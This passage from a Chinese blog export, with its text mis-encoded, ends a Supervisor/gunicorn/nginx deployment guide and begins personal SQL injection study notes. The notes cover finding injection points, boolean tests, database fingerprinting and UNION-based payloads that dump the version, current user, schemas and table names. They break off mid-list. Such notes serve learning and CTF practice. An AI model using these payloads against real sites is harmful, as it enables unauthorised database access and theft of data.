<h1 id="Supervisoré…ç½®"><a href="#Supervisoré…ç½®" class="headerlink" title="Supervisoré…ç½®"></a>Supervisoré…ç½®</h1><p><strong>ä½¿ç”¨rootç”¨æˆ·ï¼š</strong></p>
<p>é…ç½®supervisorï¼š</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">apt install supervisor</span><br><span class="line"><span class="keyword">cd</span> /etc/supervisor/<span class="keyword">conf</span>.d</span><br><span class="line"><span class="keyword">vim</span> blog.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>

<p>vimå†™å…¥ï¼š</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¿›ç¨‹çš„åå­—ï¼Œå–ä¸€ä¸ªä»¥åè‡ªå·±ä¸€çœ¼çŸ¥é“æ˜¯ä»€ä¹ˆçš„åå­—ã€‚</span></span><br><span class="line"><span class="section">[program:blog]</span></span><br><span class="line"><span class="comment"># å®šä¹‰å‘½ä»¤ã€‚ä½ åªè¦æ³¨æ„åé¢çš„ç›®å½•å¯¹å°±è¡Œã€‚ç‰¹åˆ«æ³¨æ„ã€Œrun:appã€çš„runï¼Œè¿™ä¸ªåå­—æ˜¯ä½ ç½‘ç«™åº”ç”¨çš„æ–‡ä»¶åã€‚å¦‚æœæ˜¯run.pyï¼Œå°±å†™runã€‚</span></span><br><span class="line"><span class="attr">command</span>=/home/www/blog/venv/bin/gunicorn run:app -c /home/www/blog/gunicorn.conf</span><br><span class="line"><span class="comment"># ç½‘ç«™ç›®å½•</span></span><br><span class="line"><span class="attr">directory</span>=/home/www/blog</span><br><span class="line"><span class="comment"># è¿›ç¨‹æ‰€å±ç”¨æˆ·ã€‚</span></span><br><span class="line"><span class="attr">user</span>=www</span><br><span class="line"><span class="comment"># è‡ªåŠ¨é‡å¯è®¾ç½®ã€‚</span></span><br><span class="line"><span class="attr">autostart</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">autorestart</span>=<span class="literal">true</span></span><br><span class="line"><span class="comment"># æ—¥å¿—å­˜æ”¾ä½ç½®ã€‚</span></span><br><span class="line"><span class="attr">stdout_logfile</span>=/home/www/blog/logs/gunicorn_supervisor.log</span><br><span class="line"><span class="comment"># è®¾ç½®ç¯å¢ƒå˜é‡ã€‚è¿™é‡Œè¿™è¡Œçš„æ„æ€æ˜¯ï¼šè®¾ç½®ç¯å¢ƒå˜é‡MODEçš„å€¼ä¸ºUATã€‚è¯·æ ¹æ®è‡ªå·±çš„éœ€è¦é…ç½®ï¼Œå¦‚æ²¡æœ‰éœ€è¦è¿™è¡Œå¯ä»¥åˆ é™¤ã€‚</span></span><br><span class="line"><span class="attr">environment</span> = MODE=<span class="string">"UAT"</span></span><br></pre></td></tr></table></figure>

<p><code>:wq</code>ä¿å­˜ã€‚</p>
<p><strong>å›åˆ°supervisorçš„ç›®å½•ï¼š</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/etc/supervisor</span></span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨supervisorï¼š</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">service supervisor <span class="literal">start</span></span><br></pre></td></tr></table></figure>

<p>åŠ è½½é…ç½®ï¼š</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">sudo</span> <span class="string">supervisorctl reread</span></span><br><span class="line"><span class="attr">supervisorctl</span> <span class="string">update</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">supervisorctl start blog</span></span><br></pre></td></tr></table></figure>

<h1 id="Nginxé…ç½®"><a href="#Nginxé…ç½®" class="headerlink" title="Nginxé…ç½®"></a>Nginxé…ç½®</h1><p>å¼€å§‹é…ç½®nginxï¼š</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">apt</span> <span class="string">install nginx</span></span><br><span class="line"><span class="attr">cd</span> <span class="string">/etc/nginx/sites-avaliable</span></span><br><span class="line"><span class="attr">vim</span> <span class="string">blog</span></span><br></pre></td></tr></table></figure>

<p>è¾“å…¥å¯¹äºblogçš„é…ç½®ï¼š</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">server</span> <span class="string">&#123;  </span></span><br><span class="line">        <span class="attr">listen</span>   <span class="string">80;  </span></span><br><span class="line">        <span class="attr">server_name</span> <span class="string">www.xxx.com xxx.com;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">root</span> <span class="string">/home/www/blog;</span></span><br><span class="line">        <span class="attr">access_log</span> <span class="string">/home/www/blog/logs/access.log;</span></span><br><span class="line">        <span class="attr">error_log</span> <span class="string">/home/www/blog/logs/access.log;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">location</span> <span class="string">/ &#123;  </span></span><br><span class="line">            <span class="attr">proxy_set_header</span> <span class="string">X-Forward-For $proxy_add_x_forwarded_for;  </span></span><br><span class="line">            <span class="attr">proxy_set_header</span> <span class="string">Host $http_host;  </span></span><br><span class="line">            <span class="attr">proxy_redirect</span> <span class="string">off;  </span></span><br><span class="line">            <span class="attr">if</span> <span class="string">(!-f $request_filename) &#123;  </span></span><br><span class="line">                <span class="attr">proxy_pass</span> <span class="string">http://127.0.0.1:8000;  </span></span><br><span class="line">                <span class="meta">break;</span>  <span class="string"></span></span><br><span class="line">            <span class="meta">&#125;</span>  <span class="string"></span></span><br><span class="line">        <span class="meta">&#125;</span>  <span class="string"></span></span><br><span class="line">    <span class="attr">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>æ£€æŸ¥å¹¶æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹ä¸Šé¢çš„server_nameå’Œrooté…ç½®ã€‚</strong>æ£€æŸ¥ç›‘å¬ç«¯å£å’Œä¸Šé¢è®¾ç½®æ˜¯å¦ä¸€è‡´ã€‚<code>:wq</code>ä¿å­˜ã€‚</p>
<p>ä¸‹é¢é“¾æ¥é…ç½®æ–‡ä»¶åˆ°sites-enabled:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-enabled/</span></span><br><span class="line">ln -s <span class="regexp">/etc/</span>nginx<span class="regexp">/sites-avaliable/</span>blog .<span class="regexp">/blog</span></span><br></pre></td></tr></table></figure>

<p>é‡å¯nginxï¼š</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service nginx restart</span></span><br></pre></td></tr></table></figure>

<p>é˜¿é‡Œäº‘å®‰å…¨ç»„é…ç½®å…è®¸å…¥æ–¹å‘80ç«¯å£ã€‚å®Œæˆã€‚</p>
<p>é”®å…¥åŸŸåæˆ–ipå³å¯è®¿é—®ã€‚</p>
]]></content>
      <categories>
        <category>å¼€å‘</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLæ³¨å…¥ç¬”è®°</title>
    <url>/2020/06/01/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>Sql æ³¨å…¥æ˜¯æ¸—é€æµ‹è¯•ä¸­çš„ä¸€ä¸ªé‡è¦éƒ¨åˆ†ã€‚è¿™é‡Œæ˜¯ä¸€äº› Sql æ³¨å…¥ç›¸å…³å†…å®¹çš„æ€»ç»“å’Œæ•´ç†ï¼Œç•™å¾…ä»¥åæŸ¥é˜…ã€‚</p>
<a id="more"></a>

<h2 id="Sql-æ³¨å…¥çš„æœ¬è´¨ç†è§£"><a href="#Sql-æ³¨å…¥çš„æœ¬è´¨ç†è§£" class="headerlink" title="Sql æ³¨å…¥çš„æœ¬è´¨ç†è§£"></a>Sql æ³¨å…¥çš„æœ¬è´¨ç†è§£</h2><p> Sql æ³¨å…¥çš„æœ¬è´¨æ˜¯åˆ©ç”¨ç½‘é¡µä¸­å¯æ§çš„æ³¨å…¥ç‚¹ï¼ŒåŠ¨æ€æ„é€ åç«¯çš„ Sql è¯­å¥ï¼Œè¾¾åˆ°æ³¨å…¥æ”»å‡»çš„ç›®çš„ã€‚ï¼ˆä»å®¢æˆ·ç«¯æäº¤ç‰¹æ®Šçš„ä»£ç ï¼Œä»è€Œæ”¶é›†ç¨‹åºåŠæœåŠ¡å™¨çš„ä¿¡æ¯ï¼Œä»è€Œè·å–æƒ³å¾—åˆ°çš„èµ„æ–™ã€‚ï¼‰</p>
<h2 id="Sql-æ³¨å…¥çš„ä¸€èˆ¬æ­¥éª¤"><a href="#Sql-æ³¨å…¥çš„ä¸€èˆ¬æ­¥éª¤" class="headerlink" title="Sql æ³¨å…¥çš„ä¸€èˆ¬æ­¥éª¤"></a>Sql æ³¨å…¥çš„ä¸€èˆ¬æ­¥éª¤</h2><ol>
<li>åˆ¤æ–­ç¯å¢ƒã€å¯»æ‰¾æ³¨å…¥ç‚¹ã€åˆ¤æ–­æ•°æ®åº“ç±»å‹ã€‚</li>
<li>æ ¹æ®æ³¨å…¥å‚æ•°ç±»å‹ï¼Œåœ¨è„‘æµ·ä¸­æ„é€ å¤§è‡´çš„ Sql è¯­å¥ã€‚<ul>
<li>æ•°å­—å‹ï¼š<code>Select * from è¡¨å where id=1 and [æŸ¥è¯¢æ¡ä»¶]</code> ï¼ˆæ³¨å…¥å‚æ•°ä¸º<code>id=1 and [æŸ¥è¯¢æ¡ä»¶]</code>ï¼‰</li>
<li>å­—ç¬¦å‹ï¼š<code>select * from è¡¨å where class=&#39;a&#39; and [æŸ¥è¯¢æ¡ä»¶] and &#39;&#39;=&#39;&#39;</code>ï¼ˆæ³¨å…¥å‚æ•°ä¸º<code>class=a&#39; and [æŸ¥è¯¢æ¡ä»¶] and &#39;&#39;=&#39;</code>ï¼‰</li>
<li>æœç´¢å‹ï¼šSQL è¯­å¥åŸè²Œå¤§è‡´ä¸ºï¼š<code>Select * from è¡¨å where å­—æ®µ like &#39;%å…³é”®å­—%&#39;</code> ,ç”Ÿæˆè¯­å¥å¯ä»¥æ˜¯<code>Select * from è¡¨å where å­—æ®µ like &#39;%&#39; and [æŸ¥è¯¢æ¡ä»¶] and &#39;%&#39;=&#39;%&#39;</code> ï¼ˆæ³¨å…¥å‚æ•°ä¸º<code>keyword=&#39; and [æŸ¥è¯¢æ¡ä»¶] and &#39;%25&#39;=&#39;</code>ï¼‰ï¼ˆè¯­å¥ä¸­çš„ â€˜%â€™ æ„ä¸ºæ¨¡ç³ŠæŸ¥è¯¢ï¼Œ%25 ç» URL è§£ç åä¸º â€˜%â€™ ï¼‰</li>
</ul>
</li>
<li>çŒœè§£è¡¨åï¼Œåˆ—åï¼ŒæŸ¥æ‰¾éœ€è¦çš„æ•°æ®ã€‚</li>
</ol>
<h2 id="Sql-æ³¨å…¥ç‚¹çš„åˆ¤æ–­"><a href="#Sql-æ³¨å…¥ç‚¹çš„åˆ¤æ–­" class="headerlink" title="Sql æ³¨å…¥ç‚¹çš„åˆ¤æ–­"></a>Sql æ³¨å…¥ç‚¹çš„åˆ¤æ–­</h2><h3 id="å¸¸è§æ³¨å…¥ç‚¹"><a href="#å¸¸è§æ³¨å…¥ç‚¹" class="headerlink" title="å¸¸è§æ³¨å…¥ç‚¹"></a>å¸¸è§æ³¨å…¥ç‚¹</h3><ul>
<li><p>GET è¯·æ±‚ï¼šåœ¨ URL ä¸­å‘é€å‚æ•°ã€‚</p>
</li>
<li><p>POST è¯·æ±‚ï¼šæ•°æ®è¢«åŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ã€‚</p>
</li>
<li><p><strong>å…¶å®ƒç±»å‹çš„æ³¨å…¥æ•°æ®ï¼šä¾‹å¦‚ HTTP è¯·æ±‚å¤´ç­‰</strong></p>
<p>å¸¸è§ http å¯èƒ½è¢«æ±¡æŸ“çš„å‚æ•°:</p>
<ul>
<li>User-agent æµè§ˆå™¨ç‰ˆæœ¬ ï¼ˆå°‘ï¼‰</li>
<li>Referer æ¥æºï¼ˆå°‘ï¼‰</li>
<li>X-Forwarded-For è·å– ipï¼ˆå¤šï¼‰</li>
<li>client_ip è·å– ipï¼ˆå¤šï¼‰</li>
<li>cookie è·å– cookie å€¼ï¼ˆå¤šï¼‰</li>
</ul>
</li>
</ul>
<h3 id="æ³¨å…¥ç‚¹åˆ¤æ–­æ–¹æ³•"><a href="#æ³¨å…¥ç‚¹åˆ¤æ–­æ–¹æ³•" class="headerlink" title="æ³¨å…¥ç‚¹åˆ¤æ–­æ–¹æ³•"></a>æ³¨å…¥ç‚¹åˆ¤æ–­æ–¹æ³•</h3><h4 id="è¿”å›é”™è¯¯ä¿¡æ¯"><a href="#è¿”å›é”™è¯¯ä¿¡æ¯" class="headerlink" title="è¿”å›é”™è¯¯ä¿¡æ¯"></a>è¿”å›é”™è¯¯ä¿¡æ¯</h4><p><strong>å•å¼•å·åˆ¤æ–­æ³•ï¼š</strong></p>
<p>åœ¨å‚æ•°åé¢åŠ ä¸Šå•å¼•å·å¹¶è§‚å¯Ÿã€‚<strong>å¦‚æœé¡µé¢è¿”å›é”™è¯¯ï¼Œåˆ™å­˜åœ¨ Sql æ³¨å…¥</strong>ï¼Œå³å­˜åœ¨å¯è¢«æˆ‘ä»¬æ§åˆ¶çš„åŠ¨æ€æ„é€ éƒ¨åˆ†ã€‚ åŸå› æ˜¯<strong>æ— è®ºå­—ç¬¦å‹è¿˜æ˜¯æ•´å‹éƒ½ä¼šå› ä¸ºå•å¼•å·ä¸ªæ•°ä¸åŒ¹é…è€ŒæŠ¥é”™</strong>ã€‚å‡ºç°å•å¼•å·ä¸ªæ•°ä¸åŒ¹é…è¯´æ˜æŸéƒ¨åˆ†åç«¯ä»£ç ç”¨æˆ‘ä»¬æä¾›çš„å¤šä¸€ä¸ªå¼•å·çš„å‚æ•°åŠ¨æ€æ„é€ åå¤šå‡ºäº†ä¸€ä¸ªå¼•å·ã€‚åŒæ—¶ï¼Œè¿™ç§æ–¹æ³•åœ¨é¡µé¢å‡ºç°é”™è¯¯ä¿¡æ¯çš„æ—¶å€™ä¹Ÿå¯ä»¥åˆ¤æ–­æ•°æ®åº“ç±»å‹ã€‚</p>
<p><em>å®ä¾‹ï¼š</em></p>
<blockquote>
<p>åœ¨ç½‘ç«™é¦–é¡µä¸Šï¼Œæœ‰åä¸ºâ€œIE ä¸èƒ½æ‰“å¼€æ–°çª—å£çš„å¤šç§è§£å†³æ–¹æ³•â€çš„é“¾æ¥ï¼Œåœ°å€ä¸ºï¼š<code>http://www.mytest.com/showdetail.asp?id=49</code>ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ªåœ°å€åé¢åŠ ä¸Šå•å¼•å·â€™ï¼ŒæœåŠ¡å™¨è¿”å›ä¸‹é¢çš„é”™è¯¯æç¤ºï¼š</p>
<blockquote>
<p>Microsoft JET Database Engine é”™è¯¯ â€˜80040e14â€™</p>
<p>å­—ç¬¦ä¸²çš„è¯­æ³•é”™è¯¯ åœ¨æŸ¥è¯¢è¡¨è¾¾å¼ â€˜ID=49â€™â€™ ä¸­ã€‚<br>/showdetail.aspï¼Œè¡Œ 8</p>
</blockquote>
<p><strong>ä»è¿™ä¸ªé”™è¯¯æç¤ºæˆ‘ä»¬èƒ½çœ‹å‡ºï¼š</strong></p>
<ul>
<li>ç½‘ç«™ä½¿ç”¨çš„æ˜¯ Access æ•°æ®åº“ï¼Œé€šè¿‡ JET å¼•æ“è¿æ¥æ•°æ®åº“ï¼Œè€Œä¸æ˜¯é€šè¿‡ ODBCã€‚ //å¼•æ“åŠæ•°æ®åº“ä¿¡æ¯</li>
<li>ç¨‹åºæ²¡æœ‰åˆ¤æ–­å®¢æˆ·ç«¯æäº¤çš„æ•°æ®æ˜¯å¦ç¬¦åˆç¨‹åºè¦æ±‚ã€‚ //å¯¹æ³¨å…¥çš„å¯èƒ½æ€§çš„åˆ¤æ–­</li>
<li>è¯¥ SQL è¯­å¥æ‰€æŸ¥è¯¢çš„è¡¨ä¸­æœ‰ä¸€åä¸º ID çš„å­—æ®µã€‚ //å¯¹å­—æ®µçš„åˆ¤æ–­</li>
</ul>
</blockquote>
<h4 id="ä¸è¿”å›é”™è¯¯ä¿¡æ¯"><a href="#ä¸è¿”å›é”™è¯¯ä¿¡æ¯" class="headerlink" title="ä¸è¿”å›é”™è¯¯ä¿¡æ¯"></a>ä¸è¿”å›é”™è¯¯ä¿¡æ¯</h4><p>ä¸Šè¿°çš„å•å¼•å·åˆ¤æ–­æ³•ç®€ä¾¿æ˜“ç”¨ï¼Œä½†å¹¶ä¸é€‚ç”¨äºæ‰€æœ‰çš„æƒ…å†µï¼Œå…·ä½“è§£é‡Šå¦‚ä¸‹ï¼š</p>
<blockquote>
<p>1.ä¸ä¸€å®šæ¯å°æœåŠ¡å™¨çš„ IIS éƒ½è¿”å›å…·ä½“é”™è¯¯æç¤ºç»™å®¢æˆ·ç«¯ï¼Œå¦‚æœç¨‹åºä¸­åŠ äº† cint(å‚æ•°)ä¹‹ç±»è¯­å¥çš„è¯ï¼ŒSql æ³¨å…¥æ˜¯ä¸ä¼šæˆåŠŸçš„ï¼Œä½†æœåŠ¡å™¨åŒæ ·ä¼šæŠ¥é”™ï¼Œå…·ä½“æç¤ºä¿¡æ¯ä¸ºå¤„ç† URL æ—¶æœåŠ¡å™¨ä¸Šå‡ºé”™ã€‚è¯·å’Œç³»ç»Ÿç®¡ç†å‘˜è”ç»œã€‚ 2.éƒ¨åˆ†å¯¹ Sql æ³¨å…¥æœ‰ä¸€ç‚¹äº†è§£çš„ç¨‹åºå‘˜ï¼Œè®¤ä¸ºåªè¦æŠŠå•å¼•å·è¿‡æ»¤æ‰å°±å®‰å…¨äº†ï¼Œè¿™ç§æƒ…å†µä¸ä¸ºå°‘æ•°ï¼Œå¦‚æœä½ ç”¨å•å¼•å·æµ‹è¯•ï¼Œæ˜¯æµ‹ä¸åˆ°æ³¨å…¥ç‚¹çš„ï¼Œæ‰€ä»¥è¿›ä¸€æ­¥çš„åˆ¤æ–­æ˜¯æœ‰å¿…è¦çš„ã€‚</p>
</blockquote>
<p>æ­¤æ—¶ä¸€ä¸ªç»å…¸çš„æ–¹æ³•æ˜¯<strong>å€ŸåŠ© and å’Œ or æ¥åˆ¤æ–­ï¼š</strong></p>
<ul>
<li><p>æ•°å­—å‹ï¼šå½“è¾“å…¥çš„å‚æ•° <strong>x</strong> ä¸º<strong>æ•´å‹</strong>æ—¶ï¼Œé€šå¸¸ php æ–‡ä»¶ä¸­ Sql è¯­å¥ç±»å‹å¤§è‡´å¦‚ä¸‹ï¼š <code>select * from &lt;è¡¨å&gt; where id = x</code> ã€‚ è¿™ç§ç±»å‹å¯ä»¥å…ˆç”¨ <code>and 1=1</code> å’Œ <code>and 1=2</code> æ¥åšå°è¯•ï¼š</p>
<p><em>å®ä¾‹ï¼š</em></p>
<blockquote>
<p>â‘  <code>http://www.mytest.com/showdetail.asp?id=49</code><br>â‘¡ <code>http://www.mytest.com/showdetail.asp?id=49 and 1=1</code><br>â‘¢ <code>http://www.mytest.com/showdetail.asp?id=49 and 1=2</code></p>
<p><strong>å¯ä»¥æ³¨å…¥çš„è¡¨ç°ï¼š</strong><br>â‘  æ­£å¸¸æ˜¾ç¤º<br>â‘¡ æ­£å¸¸æ˜¾ç¤ºï¼Œå†…å®¹åŸºæœ¬ä¸ â‘  ç›¸åŒã€‚</p>
<p>åå°æ‰§è¡Œ Sql è¯­å¥å¤§è‡´ä¸ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;è¡¨å&gt; <span class="keyword">where</span> <span class="keyword">id</span> = x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰è¯­æ³•é”™è¯¯ä¸”é€»è¾‘åˆ¤æ–­ä¸ºæ­£ç¡®ï¼Œæ‰€ä»¥è¿”å›æ­£å¸¸ã€‚</p>
<p>â‘¢ æç¤º BOF æˆ– EOFï¼ˆç¨‹åºæ²¡åšä»»ä½•åˆ¤æ–­æ—¶ï¼‰ã€æˆ–æç¤ºæ‰¾ä¸åˆ°è®°å½•ï¼ˆåˆ¤æ–­äº† rs.eof æ—¶ï¼‰ã€æˆ–æ˜¾ç¤ºå†…å®¹ä¸ºç©ºï¼ˆç¨‹åºåŠ äº† on error resume nextï¼‰</p>
<p>åå°æ‰§è¡Œ Sql è¯­å¥å¤§è‡´ä¸ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;è¡¨å&gt; <span class="keyword">where</span> <span class="keyword">id</span> = x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰è¯­æ³•é”™è¯¯ä½†æ˜¯é€»è¾‘åˆ¤æ–­ä¸ºå‡ï¼Œæ‰€ä»¥è¿”å›é”™è¯¯ã€‚</p>
<p><strong>ä¸å¯ä»¥æ³¨å…¥çš„è¡¨ç°ï¼š</strong></p>
<p>â‘  åŒæ ·æ­£å¸¸æ˜¾ç¤ºï¼Œâ‘¡ å’Œ â‘¢ ä¸€èˆ¬éƒ½ä¼šæœ‰ç¨‹åºå®šä¹‰çš„é”™è¯¯æç¤ºï¼Œæˆ–æç¤ºç±»å‹è½¬æ¢æ—¶å‡ºé”™ã€‚</p>
</blockquote>
<p>æˆ–è€…æˆ‘ä»¬ä¹Ÿå¯ä»¥å…ˆæŠŠå‚æ•°æ”¹ä¸ºå¾ˆå¤§çš„æ•°æˆ–è´Ÿæ•°ï¼Œè¦è®©å®ƒæŸ¥è¯¢ä¸åˆ°æ•°æ®ï¼Œå†åœ¨æœ€ååŠ ä¸Š or 1=1 å°±æˆåŠŸè¿”å›äº†æ•°æ®ï¼Œè¿™æ˜¯å› ä¸º 1=1 ä¸ºçœŸï¼Œä¸ç®¡å‰é¢æ˜¯ä¸æ˜¯å‡ï¼Œæ•°æ®éƒ½ä¼šè¿”å›ã€‚å½“ or 1=2 æ—¶ï¼Œå› ä¸º 1=2 ä¸ºå‡ï¼Œå‰åéƒ½ä¸ºå‡ï¼Œæœ€ç»ˆä¹Ÿæ˜¯å‡ï¼Œæ•°æ®å°±ä¸ä¼šè¿”å›äº†ã€‚</p>
</li>
<li><p>å­—ç¬¦å‹ï¼šå½“è¾“å…¥çš„å‚æ•° <strong>x ä¸ºå­—ç¬¦å‹</strong>æ—¶ï¼Œé€šå¸¸ php æ–‡ä»¶ä¸­ SQL è¯­å¥ç±»å‹å¤§è‡´å¦‚ä¸‹ï¼š <code>select * from &lt;è¡¨å&gt; where id = &#39;x&#39;</code> è¿™ç§ç±»å‹æˆ‘ä»¬åŒæ ·å¯ä»¥ä½¿ç”¨ <code>and &#39;1&#39;=&#39;1</code> å’Œ <code>and &#39;1&#39;=&#39;2</code>æ¥åˆ¤æ–­ï¼š</p>
<blockquote>
<p>â‘  URL åœ°å€ä¸­è¾“å…¥ <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;1</code> é¡µé¢è¿è¡Œæ­£å¸¸ï¼Œç»§ç»­è¿›è¡Œä¸‹ä¸€æ­¥ã€‚</p>
<p>â‘¡ URL åœ°å€ä¸­è¾“å…¥ <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;2</code> é¡µé¢è¿è¡Œé”™è¯¯ï¼Œåˆ™è¯´æ˜æ­¤ Sql æ³¨å…¥ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‚</p>
</blockquote>
</li>
<li><p>é™¤æ­¤ä¹‹å¤–è¿˜æœ‰æœç´¢å‹æ³¨å…¥ï¼Œç­‰åšåˆ°ç›¸å…³é¢˜ç›®å†è¡Œè¡¥å……ã€‚</p>
</li>
</ul>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="æ•°æ®åº“ç±»å‹åˆ¤æ–­"><a href="#æ•°æ®åº“ç±»å‹åˆ¤æ–­" class="headerlink" title="æ•°æ®åº“ç±»å‹åˆ¤æ–­"></a>æ•°æ®åº“ç±»å‹åˆ¤æ–­</h3><h4 id="é€šè¿‡ç½‘ç«™è„šæœ¬ç±»å‹åˆ¤æ–­"><a href="#é€šè¿‡ç½‘ç«™è„šæœ¬ç±»å‹åˆ¤æ–­" class="headerlink" title="é€šè¿‡ç½‘ç«™è„šæœ¬ç±»å‹åˆ¤æ–­"></a>é€šè¿‡ç½‘ç«™è„šæœ¬ç±»å‹åˆ¤æ–­</h4><ul>
<li>PHP -&gt; Oracleã€MySQL</li>
<li>JSP -&gt; Oracleã€MySQL</li>
<li>ASP/.NET -&gt; SQL Server</li>
</ul>
<h4 id="é€šè¿‡é”™è¯¯ä¿¡æ¯åˆ¤æ–­"><a href="#é€šè¿‡é”™è¯¯ä¿¡æ¯åˆ¤æ–­" class="headerlink" title="é€šè¿‡é”™è¯¯ä¿¡æ¯åˆ¤æ–­"></a>é€šè¿‡é”™è¯¯ä¿¡æ¯åˆ¤æ–­</h4><ul>
<li>MySQL -&gt; <code>error:You have an error in your SQL syntax; check themanual that corresponds to your MySQL server version</code></li>
<li>Oracle -&gt; <code>Microsoft OLE DB Provider for ODBC Drivers é”™è¯¯</code></li>
</ul>
<h4 id="é€šè¿‡æ•°å­—å‡½æ•°åˆ¤æ–­"><a href="#é€šè¿‡æ•°å­—å‡½æ•°åˆ¤æ–­" class="headerlink" title="é€šè¿‡æ•°å­—å‡½æ•°åˆ¤æ–­"></a>é€šè¿‡æ•°å­—å‡½æ•°åˆ¤æ–­</h4><ul>
<li>SQL Server -&gt; <code>@@pack_receivedã€@@rowcount</code></li>
<li>MySQL -&gt; <code>connection_id()ã€last_insert_id() ã€ row_count()</code></li>
<li>Oracle -&gt; <code>BITAND(1,1)</code></li>
<li>PostgreSQL -&gt; <code>select EXTRACT(DOW FROMNOW())</code></li>
</ul>
<h3 id="é€šè¿‡-UNION-è¯­å¥æå–æ•°æ®"><a href="#é€šè¿‡-UNION-è¯­å¥æå–æ•°æ®" class="headerlink" title="é€šè¿‡ UNION è¯­å¥æå–æ•°æ®"></a>é€šè¿‡ UNION è¯­å¥æå–æ•°æ®</h3><blockquote>
<p>UNION æ“ä½œç¬¦å¯ä»¥åˆå¹¶ä¸¤æ¡æˆ–å¤šæ¡ SELECT è¯­å¥çš„æŸ¥è¯¢ç»“æœï¼ŒåŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š<br><code>select column1 column2 from table1 UNION select column1 column2 from table2</code></p>
</blockquote>
<p><strong>ä½¿ç”¨ UNION è¯­å¥éœ€è¦æ»¡è¶³çš„æ¡ä»¶ï¼š</strong> å‰åä¸¤ä¸ªæŸ¥è¯¢çš„åˆ—æ•°åŠå¯¹åº”åˆ—çš„æ•°æ®ç±»å‹å¿…é¡»ç›¸ç­‰ã€‚</p>
<p><em>ä¸€èˆ¬è¿‡ç¨‹ä¸ºï¼š</em></p>
<h4 id="è·å¾—åˆ—æ•°"><a href="#è·å¾—åˆ—æ•°" class="headerlink" title="è·å¾—åˆ—æ•°"></a>è·å¾—åˆ—æ•°</h4><p>ä½¿ç”¨ <code>order by</code> è¯­å¥ã€‚æœ€å¤§ä¸”ä¸æŠ¥é”™çš„æ•°å€¼å³ä¸ºåˆ—æ•°ã€‚</p>
<h4 id="è·å¾—å›æ˜¾ç‚¹"><a href="#è·å¾—å›æ˜¾ç‚¹" class="headerlink" title="è·å¾—å›æ˜¾ç‚¹"></a>è·å¾—å›æ˜¾ç‚¹</h4><p>ä½¿ç”¨ <code>union select</code> è¯­å¥ï¼ŒæŸ¥çœ‹å›æ˜¾ç‚¹ã€‚</p>
<p><em>ä½¿ç”¨ä¾‹ï¼š</em> <code>?id=-1&#39; union select 1,2,3 %23</code></p>
<blockquote>
<p>è¯´æ˜ï¼š</p>
<p>å…ˆæŸ¥è¯¢ä¸€ä¸ª<strong>ä¸å­˜åœ¨çš„å‚æ•°</strong>ï¼Œæœ¬åº”è¯¥è¿”å›ç©ºçš„ï¼›<br>ä½†æ˜¯ä½¿ç”¨ UNION æŸ¥è¯¢ï¼Œä¼šè¾“å‡ºåé¢çš„æŸ¥è¯¢ï¼›<br>ç”¨<strong>æ•°å­—å»å ä½</strong>ï¼Œæ‰€ä»¥èƒ½çœ‹åˆ°çš„æ•°å­—å°±æ˜¯å›æ˜¾ç‚¹ã€‚</p>
</blockquote>
<h4 id="çŒœè§£æ•°æ®åº“"><a href="#çŒœè§£æ•°æ®åº“" class="headerlink" title="çŒœè§£æ•°æ®åº“"></a>çŒœè§£æ•°æ®åº“</h4><ul>
<li><p>æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ï¼š</p>
<p><code>?id=&#39; union select 1, version(), 3 %23</code></p>
</li>
<li><p>å½“å‰æ•°æ®åº“å’Œç”¨æˆ·ï¼š</p>
<p><code>?id=&#39; union select 1, database(), user() %23</code></p>
</li>
<li><p>æ‰€æœ‰æ•°æ®åº“ï¼š</p>
<p><code>?id=&#39; union select 1, (select group_concat(schema_name) from information_schema.schemata), 3 %23</code></p>
</li>
<li><p>è¡¨åï¼š</p>
<p><code>?id=&#39; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#39;&lt;å½“å‰æ•°æ®åº“åç§°&gt;&#39;), 3 %23</code></p>
</li>
<li><p>åˆ—åï¼š</p>
